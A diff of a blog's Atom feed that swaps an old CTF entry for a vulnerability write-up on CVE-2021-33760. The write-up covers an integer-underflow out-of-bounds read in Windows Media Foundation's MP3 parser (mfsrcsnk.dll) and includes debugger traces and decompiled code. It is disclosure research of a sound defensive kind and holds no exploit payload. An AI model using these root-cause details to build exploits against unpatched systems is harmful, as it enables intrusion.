@@ -1,4 +1,166 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-01T11:55:25+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Home</title><subtitle>MiloTruck's Portfolio containing Cybersecurity, Data Science, Programming and other IT-related projects.</subtitle><author><name>MiloTruck</name></author><entry><title type="html">DSO-NUS CTF 2021</title><link href="http://localhost:4000/ctf/DSO-NUS-CTF-2021/" rel="alternate" type="text/html" title="DSO-NUS CTF 2021" /><published>2021-03-01T00:00:00+08:00</published><updated>2021-03-01T00:00:00+08:00</updated><id>http://localhost:4000/ctf/DSO%20NUS%20CTF%202021</id><content type="html" xml:base="http://localhost:4000/ctf/DSO-NUS-CTF-2021/">&lt;p&gt;A local Singaporean CTF hosted by DSO National Laboratories and the National University of Singapore (NUS). I played this CTF with my regular teammate, &lt;a href=&quot;https://blog.puddle.sg/&quot;&gt;@OceanKoh&lt;/a&gt;, under the name &lt;strong&gt;It’z Me&lt;/strong&gt;. We managed to get 6th place, which I’m quite satisified with. Not bad for the first official CTF of 2021.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-01T13:13:57+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Home</title><subtitle>MiloTruck's Portfolio containing Cybersecurity, Data Science, Programming and other IT-related projects.</subtitle><author><name>MiloTruck</name></author><entry><title type="html">CVE-2021-33760</title><link href="http://localhost:4000/blog/CVE-2021-33760/" rel="alternate" type="text/html" title="CVE-2021-33760" /><published>2021-12-01T00:00:00+08:00</published><updated>2021-12-01T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2021-33760</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2021-33760/">&lt;h1 id=&quot;windows-media-foundation-out-of-bounds-read-vulnerability-mfsrcsnkdll&quot;&gt;Windows Media Foundation Out-of-Bounds Read Vulnerability (mfsrcsnk.dll)&lt;/h1&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;p&gt;A vulnerability is present in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mfsrcsnk.dll&lt;/code&gt;, which is part of the &lt;strong&gt;Microsoft Media Foundation framework&lt;/strong&gt;. An integer underflow leads to an Out-of-Bounds (OOB) Read when parsing an MP3 frame header. The vulnerability can be triggered by right-clicking on the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.mp3&lt;/code&gt; in Windows Explorer with Page Heap enabled on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-number&quot;&gt;CVE Number&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33760&quot;&gt;CVE-2021-33760&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;tested-versions&quot;&gt;Tested Versions&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Software&lt;/th&gt;
+      &lt;th&gt;Version&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Windows 10 - Media Foundation MP3 File Source DLL&lt;/td&gt;
+      &lt;td&gt;10.0.19041.1316&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;
+
+&lt;p&gt;The crash occurs in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mfsrcsnk.dll&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; g
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;56c8.7dc4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Access violation - code c0000005 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;first/second chance not available&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+Time Travel Position: B8573:0
+mfsrcsnk!CMPEGFrame::DeSerializeFrameHeader+0x42:
+00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629f872 418b0e          mov     ecx,dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r14] ds:000001c7&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;29218504&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;????????
+0:000&amp;gt; k
+ &lt;span class=&quot;c&quot;&gt;# Child-SP          RetAddr               Call Site&lt;/span&gt;
+00 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cde80 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629d50c     mfsrcsnk!CMPEGFrame::DeSerializeFrameHeader+0x42
+01 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdf00 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629cb58     mfsrcsnk!CMP3MediaSourcePlugin::ReadMPEGFrameHeader+0x78
+02 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdf70 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629e8bc     mfsrcsnk!CMP3MediaSourcePlugin::DoReadFrameHeader+0x5c
+03 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdff0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629f1fa     mfsrcsnk!CMP3MediaSourcePlugin::ParseHeader+0x1cc
+04 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce0d0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629f060     mfsrcsnk!CMFMP3PropertyHandler::FeedNextBufferToPlugin+0x12e
+05 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce170 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;262992e3     mfsrcsnk!CMFMP3PropertyHandler::FeedBuffersToPlugin+0x9c
+06 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce230 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;262a9da4     mfsrcsnk!CMFMP3PropertyHandler::InternalInitialize+0x103
+07 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce300 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f400df9     mfsrcsnk!CMFPropHandlerBase::Initialize+0x84
+08 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce360 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3fdcfb     windows_storage!InitializeFileHandlerWithStream+0x175
+09 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce420 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f43a345     windows_storage!CFileSysItemString::HandlerCreateInstance+0x2c7
+0a 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce510 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3de47a     windows_storage!CFileSysItemString::_PropertyHandlerCreateInstance+0xad
+0b 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce5c0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3ece20     windows_storage!CFileSysItemString::LoadHandler+0x1aa
+0c 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ce710 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3c9d95     windows_storage!CFSFolder::LoadHandler+0xe0
+0d 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cea70 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3caeca     windows_storage!CFSPropertyStoreFactory::_GetFileStore+0x165
+0e 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7ceb40 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3cb042     windows_storage!CFSPropertyStoreFactory::_GetPropertyStore+0x20e
+0f 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cec30 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3ca824     windows_storage!CFSPropertyStoreFactory::GetPropertyStore+0x22
+10 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cec70 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5f3ca3cb     windows_storage!CShellItem::_GetPropertyStoreWorker+0x384
+11 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf1b0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;5fd09e3b     windows_storage!CShellItem::GetPropertyStore+0xdb
+12 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf480 00007ff6&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;10d611ab     SHELL32!SHGetPropertyStoreFromParsingName+0x5b
+13 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf4f0 00007ff6&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;10d6111d     harness!fuzzme+0x3b
+14 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf540 00007ff6&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;10d615f4     harness!wmain+0x11d
+15 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf7a0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;611f7c24     harness!fuzzme+0x484
+16 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf7e0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;61aad721     KERNEL32!BaseThreadInitThunk+0x14
+17 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cf810 00000000&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;00000000     ntdll!RtlUserThreadStart+0x21
+0:000&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;heap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; @r14
+    address 000001c729218504 found &lt;span class=&quot;k&quot;&gt;in
+    &lt;/span&gt;_DPH_HEAP_ROOT @ 1c7290a1000
+    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;busy allocation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                             1c7290a5d68:      1c729214000             4000 -      1c729213000             6000
+    00007ffb61b4462f ntdll!RtlDebugAllocateHeap+0x000000000000003f
+    00007ffb61af501e ntdll!RtlpAllocateHeap+0x0000000000078cce
+    00007ffb61a7b4bb ntdll!RtlpAllocateHeapInternal+0x0000000000000a1b
+    00007ffb60209da0 msvcrt!malloc+0x0000000000000070
+    00007ffb541aad4b MFPlat!operator new+0x0000000000000023
+    00007ffb541a1d76 MFPlat!MFCreateMemoryBuffer+0x0000000000000056
+    00007ffb2629f140 mfsrcsnk!CMFMP3PropertyHandler::FeedNextBufferToPlugin+0x0000000000000074
+    00007ffb2629f060 mfsrcsnk!CMFMP3PropertyHandler::FeedBuffersToPlugin+0x000000000000009c
+    00007ffb262992e3 mfsrcsnk!CMFMP3PropertyHandler::InternalInitialize+0x0000000000000103
+    00007ffb262a9da4 mfsrcsnk!CMFPropHandlerBase::Initialize+0x0000000000000084
+    00007ffb5f400df9 windows_storage!InitializeFileHandlerWithStream+0x0000000000000175
+    00007ffb5f3fdcfb windows_storage!CFileSysItemString::HandlerCreateInstance+0x00000000000002c7
+    00007ffb5f43a345 windows_storage!CFileSysItemString::_PropertyHandlerCreateInstance+0x00000000000000ad
+    00007ffb5f3de47a windows_storage!CFileSysItemString::LoadHandler+0x00000000000001aa
+    00007ffb5f3ece20 windows_storage!CFSFolder::LoadHandler+0x00000000000000e0
+    00007ffb5f3c9d95 windows_storage!CFSPropertyStoreFactory::_GetFileStore+0x0000000000000165
+    00007ffb5f3caeca windows_storage!CFSPropertyStoreFactory::_GetPropertyStore+0x000000000000020e
+    00007ffb5f3cb042 windows_storage!CFSPropertyStoreFactory::GetPropertyStore+0x0000000000000022
+    00007ffb5f3ca824 windows_storage!CShellItem::_GetPropertyStoreWorker+0x0000000000000384
+    00007ffb5f3ca3cb windows_storage!CShellItem::GetPropertyStore+0x00000000000000db
+    00007ffb5fd09e3b SHELL32!SHGetPropertyStoreFromParsingName+0x000000000000005b
+    00007ff610d611ab harness!fuzzme+0x000000000000003b
+    00007ff610d6111d harness!wmain+0x000000000000011d
+    00007ff610d615f4 harness!fuzzme+0x0000000000000484
+    00007ffb611f7c24 KERNEL32!BaseThreadInitThunk+0x0000000000000014
+    00007ffb61aad721 ntdll!RtlUserThreadStart+0x0000000000000021
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As seen above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@r14&lt;/code&gt; points to an invalid region on the heap.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::ParseHeader+0x314 (mfsrcsnk.dll+0xea04)&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::DoScanForFrameHeader()&lt;/code&gt; is called. This stores the value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2282&lt;/code&gt; into the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// buf = 0x000001c729214000, remaining_size = 0x00000000000022e6, &amp;amp;offset = 0x0000003fdc7ce060&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CMP3MediaSourcePlugin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DoScanForFrameHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MPEGFrame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::ParseHeader+0x20e (mfsrcsnk.dll+0xe8fe)&lt;/code&gt; the variables &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; are updated.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;LABEL_29:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0x00000000000022e6 - 0x0000000000002282 = 0x0000000000000064 &lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// 0x000001c729214000 + 0x0000000000002282 = 0x000001c729216282&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::ParseHeader+0x2d9 (mfsrcsnk.dll+0xe9c9)&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::DoReadFirstFrameBody()&lt;/code&gt; is called.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// buf=000001c729216282, remaining_size=0000000000000064, &amp;amp;offset=0000003fdc7ce060&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CMP3MediaSourcePlugin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DoReadFirstFrameBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MPEGFrame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Eventually, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMPEGFrame::DeSerializeFrameBody()&lt;/code&gt; is called with the same arguments:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; k
+ &lt;span class=&quot;c&quot;&gt;# Child-SP          RetAddr               Call Site&lt;/span&gt;
+00 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdee8 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629f789     mfsrcsnk!CMPEGFrame::DeSerializeFrameBody
+01 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdef0 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629aaa1     mfsrcsnk!CMP3MediaSourcePlugin::ReadMPEGFrameBody+0x49
+02 0000003f&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dc7cdf60 00007ffb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;2629e9ce     mfsrcsnk!CMP3MediaSourcePlugin::DoReadFirstFrameBody+0x41
+0:000&amp;gt; r rcx, rdx, r8, r9
+&lt;span class=&quot;nv&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;000001c72921bea0 &lt;span class=&quot;nv&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;000001c729216282 &lt;span class=&quot;nv&quot;&gt;r8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0000000000000064 &lt;span class=&quot;nv&quot;&gt;r9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0000003fdc7ce060
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMPEGFrame::DeSerializeFrameBody+0x2fe5f (mfsrcsnk.dll+0x3f15f)&lt;/code&gt;, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; is less than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;required_size&lt;/code&gt;, the check fails and the function immediately returns with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HRESULT 0&lt;/code&gt;. The value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt; is not updated and remains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2282&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body_tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofnI&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;required_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required_size&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// required_size = 0x74&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;LABEL_22:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CallStackScopeTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CallStackScopeTrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP3MediaSourcePlugin::ParseHeader+0x2f7 (mfsrcsnk.dll+0xe9eb)&lt;/code&gt;, the variables &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; are updated again. However, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsigned int&lt;/code&gt;, an integer underflow occurs, causing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; to store a large value. Also, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; now points to an invalid heap region.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0x0000000000000064 - 0x0000000000002282 = 0x00000000ffffdde2&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// 0x000001c729216282 + 0x0000000000002282 = 000001c729218504&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMPEGFrame::DeSerializeFrameHeader+0x39 (mfsrcsnk.dll+0xf869)&lt;/code&gt;, a check is performed. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remaining_size&lt;/code&gt; contains a large value, the check is passed. Execution flow continues, causing an OOB Read and a crash when trying to access the invalid pointer stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt;.&lt;/p&gt;
+
